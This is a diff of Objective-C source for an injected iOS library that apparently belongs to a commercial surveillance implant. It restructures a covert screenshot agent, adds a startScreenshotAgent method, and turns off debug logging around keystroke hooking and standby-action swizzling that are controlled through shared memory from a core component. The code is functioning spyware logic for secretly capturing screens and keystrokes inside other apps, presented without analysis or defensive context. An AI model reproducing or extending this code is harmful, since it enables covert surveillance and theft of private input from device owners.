@@ -482,7 +482,7 @@ CTSIMSupportGetSIMStatus_t __CTSIMSupportGetSIMStatus;
             {
               memcpy(&gStandByActions, shMemCommand->commandData, sizeof(standByStruct));
 
-#ifdef DEBUG
+#ifdef DEBUG_TMP
               NSLog(@"[DYLIB] %s: start STANDBY swizziling onLock %d, onUnlock %d", 
                     __FUNCTION__, gStandByActions.actionOnLock, gStandByActions.actionOnUnlock);
 #endif      
@@ -492,7 +492,7 @@ CTSIMSupportGetSIMStatus_t __CTSIMSupportGetSIMStatus;
             }
           else if (stdFlag == 1 && shMemCommand->command == AG_STOP)
             {
-#ifdef DEBUG
+#ifdef DEBUG_TMP
               NSLog(@"[DYLIB] %s: STANDBY swizziling", __FUNCTION__);
 #endif     
               stdFlag = 0;
@@ -795,12 +795,38 @@ BOOL triggerStanByAction(UInt32 aAction)
 #endif
 }
 
+- (BOOL)startScreenshotAgent
+{
+  RCSIAgentScreenshot *scrAgent = [RCSIAgentScreenshot sharedInstance];
+  
+  if ([scrAgent testAndSetIsAlreadyRunning] == TRUE)
+    {
+      [NSThread detachNewThreadSelector: @selector(start)
+                               toTarget: scrAgent
+                             withObject: nil];
+
+      NSMutableData *agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)]; 
+      shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
+      shMemoryHeader->agentID         = AGENT_SCREENSHOT;
+      shMemoryHeader->direction       = D_TO_AGENT;
+      shMemoryHeader->command         = AG_STOP;
+      shMemoryHeader->commandDataSize = 0;
+      
+      if ([mSharedMemoryCommand writeMemory: agentCommand
+                                     offset: OFFT_SCREENSHOT
+                              fromComponent: COMP_CORE])
+        return TRUE;
+      else
+        return FALSE;                     
+    }
+    
+  return TRUE;
+}
+
 - (void)communicateWithCore
 {  
-  NSMutableDictionary *agentConfiguration;
-  
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
-  
+   
   //
   // Here we need to start the loop for checking and reading any configuration
   // change made on the shared memory
@@ -819,7 +845,7 @@ BOOL triggerStanByAction(UInt32 aAction)
   
   if ([mSharedMemoryLogging createMemoryRegionForAgent] == -1)
     {
-#ifdef DEBUG
+#ifdef DEBUG_TMP
       NSLog (@"[DYLIB] %s: There was an error while creating the Logging Shared Memory", __FUNCTION__);
 #endif
       return;
@@ -827,7 +853,7 @@ BOOL triggerStanByAction(UInt32 aAction)
   
   if ([mSharedMemoryCommand attachToMemoryRegion: NO] == -1)
     {
-#ifdef DEBUG
+#ifdef DEBUG_TMP
       NSLog (@"[DYLIB] %s: There was an error while attaching to the Commands Shared Memory", __FUNCTION__);
 #endif
       return;
@@ -835,7 +861,7 @@ BOOL triggerStanByAction(UInt32 aAction)
   
   if ([mSharedMemoryCommand createMemoryRegionForAgent] == -1)
     {
-#ifdef DEBUG
+#ifdef DEBUG_TMP
       NSLog (@"[DYLIB] %s: There was an error while creating the Commands Shared Memory", __FUNCTION__);
 #endif
       return;
@@ -882,41 +908,15 @@ BOOL triggerStanByAction(UInt32 aAction)
       // Silly Code but it's faster than a switch/case inside a loop
       readData = [mSharedMemoryCommand readMemory: OFFT_SCREENSHOT
                                     fromComponent: COMP_AGENT];
-
+                                    
       if (readData != nil)
         {
-#ifdef DEBUG_VERBOSE_1
-          NSLog(@"[DYLIB] %s: command = %@", __FUNCTION__, readData);
-#endif
           shMemCommand = (shMemoryCommand *)[readData bytes];
           
-          if (scrFlag == 0
-              && shMemCommand->command == AG_START)
+          if (shMemCommand->agentID == AGENT_SCREENSHOT &&
+              shMemCommand->command == AG_START)
             {
-              scrFlag = 1;
-
-              // XXX- try to release
-              NSData *agentData = [[NSData alloc] initWithBytes: shMemCommand->commandData 
-                                                         length: shMemCommand->commandDataSize];
-#ifdef DEBUG_
-            NSLog(@"[DYLIB] %s: Started Screenshot Agent %@", __FUNCTION__, agentData);
-#endif
-              agentConfiguration = [[NSMutableDictionary alloc] init];
-
-              [agentConfiguration setObject: AGENT_START 
-                                     forKey: @"status"];
-              [agentConfiguration setObject: agentData 
-                                     forKey: @"data"];
-
-              RCSIAgentScreenshot *scrAgent = [RCSIAgentScreenshot sharedInstance];
-              [scrAgent setAgentConfiguration: agentConfiguration];
-
-              [agentConfiguration release];
-            }
-          else if ((scrFlag == 1 || scrFlag == 2)
-                   && shMemCommand->command == AG_STOP)
-            {
-              scrFlag = 3;
+              [self startScreenshotAgent];
             }
             
           [readData release];
@@ -993,7 +993,7 @@ BOOL triggerStanByAction(UInt32 aAction)
 
       if (readData != nil)
         {
-#ifdef DEBUG_VERBOSE_1
+#ifdef DEBUG
           NSLog(@"[DYLIB] %s: command = %@", __FUNCTION__, readData);
 #endif
 
@@ -1002,7 +1002,7 @@ BOOL triggerStanByAction(UInt32 aAction)
           if (keyboardFlag == 0
               && shMemCommand->command == AG_START)
             {
-#ifdef DEBUG
+#ifdef DEBUG_TMP
               NSLog(@"[DYLIB] %s: Starting Agent Keylog", __FUNCTION__);
 #endif
 
@@ -1011,7 +1011,7 @@ BOOL triggerStanByAction(UInt32 aAction)
           else if ((keyboardFlag == 1 || keyboardFlag == 2)
                    && shMemCommand->command == AG_STOP)
             {
-#ifdef DEBUG
+#ifdef DEBUG_TMP
               NSLog(@"[DYLIB] %s: Stopping Agent Keylog", __FUNCTION__);
 #endif
 
@@ -1052,31 +1052,6 @@ BOOL triggerStanByAction(UInt32 aAction)
             }
 
           [readData release];
-        }
-
-      if (scrFlag == 1)
-        {
-          scrFlag = 2;
-    
-          RCSIAgentScreenshot *scrAgent = [RCSIAgentScreenshot sharedInstance];
-
-          [NSThread detachNewThreadSelector: @selector(start)
-                                   toTarget: scrAgent
-                                 withObject: nil];
-
-#ifdef DEBUG
-          NSLog(@"[DYLIB] %s: Started screenshot Agent", __FUNCTION__);
-#endif
-        }
-      else if (scrFlag == 3)
-        {
-          scrFlag = 0;
-          RCSIAgentScreenshot *scrAgent = [RCSIAgentScreenshot sharedInstance];
-
-          [scrAgent stop];
-#ifdef DEBUG
-          NSLog(@"[DYLIB] %s: Stopped Agent Screenshot", __FUNCTION__);
-#endif
         }
 
       if (urlFlag == 1)
@@ -1157,7 +1132,7 @@ BOOL triggerStanByAction(UInt32 aAction)
         {
           keyboardFlag = 2;
 
-#ifdef DEBUG
+#ifdef DEBUG_TMP
           NSLog(@"Hooking Keystrokes");
 #endif
 
@@ -1174,7 +1149,7 @@ BOOL triggerStanByAction(UInt32 aAction)
             }
           else
             {
-#ifdef DEBUG
+#ifdef DEBUG_TMP
               NSLog(@"Not the right application, skipping");
 #endif
             }
@@ -1192,7 +1167,7 @@ BOOL triggerStanByAction(UInt32 aAction)
         {
           keyboardFlag = 0;
 
-#ifdef DEBUG
+#ifdef DEBUG_TMP
           NSLog(@"Unhooking Keystrokes");
 #endif
 
@@ -1206,7 +1181,7 @@ BOOL triggerStanByAction(UInt32 aAction)
             }
           else
             {
-#ifdef DEBUG
+#ifdef DEBUG_TMP
               NSLog(@"Not the right application, skipping");
 #endif
             }
@@ -1269,19 +1244,6 @@ BOOL triggerStanByAction(UInt32 aAction)
         }
 
       [[NSRunLoop currentRunLoop] runUntilDate: [NSDate dateWithTimeIntervalSinceNow: 0.2]];
-    
-#ifdef JSON_CONFIG  
-      RCSIAgentScreenshot *scrAgent = [RCSIAgentScreenshot sharedInstance];
-      
-      // resetta scrFlag: il thread precedente di start
-      // e' finito: agente e' restartabile
-      if (scrFlag == 2 &&
-          shMemCommand->command == AG_START &&
-          [scrAgent isAlreadyRunning] == FALSE)
-        {
-        scrFlag = 0;
-        }
-#endif
  
       [innerPool release];
     }
